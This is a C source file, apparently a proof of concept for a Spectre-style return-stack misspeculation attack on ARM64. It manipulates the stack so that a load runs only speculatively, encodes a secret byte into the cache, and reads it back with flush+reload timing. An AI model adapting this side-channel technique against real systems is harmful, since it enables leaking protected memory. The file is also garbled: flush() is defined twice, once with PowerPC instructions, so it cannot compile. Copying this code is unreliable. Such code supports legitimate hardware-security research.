#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// inaccessible secret

#define CACHE_MISS 80

int junk;
char *probe_buf;
char secret = 'S';
int pagesize = 4096;

uint64_t rdtsc() {
  asm volatile("DSB SY");
  asm volatile("ISB");
  struct timespec t1;
  clock_gettime(CLOCK_MONOTONIC, &t1);
  uint64_t res = t1.tv_sec * 1000 * 1000 * 1000ULL + t1.tv_nsec;
  asm volatile("ISB");
  asm volatile("DSB SY");
  return res;
}

void flush(void *p) {
  asm volatile("DC CIVAC, %0" ::"r"(p));
  asm volatile("DSB ISH");
  asm volatile("ISB");
}

// ---------------------------------------------------------------------------
void maccess(void *p) {
  volatile uint32_t value;
  asm volatile("LDR %0, [%1]\n\t" : "=r"(value) : "r"(p));
  asm volatile("DSB ISH");
  asm volatile("ISB");
}

void mfence() { asm volatile("DSB ISH"); }

void flush(void *p) { asm volatile( "dcbf 0, %0\n\t"
				    "dcs\n\t"
				    "ics\n\t"
				    :  : "r"(p) : ); }

int flush_reload_t(void *ptr) {
  register uint64_t start = 0, end = 0;
  start = rdtsc();
  maccess(ptr);

  end = rdtsc();
  mfence();
  flush(ptr);

  return (int)(end - start);
}

// Pop return address from the software stack, causing misspeculation when hitting the return
int __attribute__ ((noinline)) call_manipulate_stack() {
  asm volatile("ldp x29, x30, [sp],#16\n" : : : "x29");
  return 0;
}

int __attribute__ ((noinline)) call_leak() {
  // Manipulate the stack so that we don't return here, but to call_start
  call_manipulate_stack();
  // architecturally, this is never executed
  // Encode data in covert channel
  maccess(probe_buf + secret*pagesize);
  mfence();
  return 2;
}

int __attribute__ ((noinline)) call_start() {
  call_leak();
  mfence();
  return 1;
}

void confuse_compiler() {
  // this function -- although never called -- is required
  // otherwise, the compiler replaces the calls with jumps
  call_start();
  call_leak();
  call_manipulate_stack();
}

int main(int argc, const char **argv) {
  // Detect cache threshold
  int mix_i;

  probe_buf = malloc(256 * pagesize);
  memset(probe_buf,0,256*pagesize);

    
  
  for (int p =0; p < 8; p++) { // ! introducing for loop changes where a hit is measured
    // for every byte in the string
    for (int j = 0; j < 256; j++){
        flush(probe_buf + j*pagesize);
    }
    mfence();
    
    
    //maccess(probe_buf + 'S' * pagesize);
    call_start();
    mfence();

    // Recover data from covert channel
    
    for (int i = 0; i < 256; i++) {
        mix_i = ((i * 167) + 13) & 255;
        if (flush_reload_t(probe_buf + mix_i * pagesize) <= CACHE_MISS){
            printf("hit at %d\n",mix_i);
        }
    }

    mfence();
  }
  //printf("\n\x1b[1A[ ]\n\n[\x1b[32m>\x1b[0m] Done\n");
  free(probe_buf);

  return (0);
}
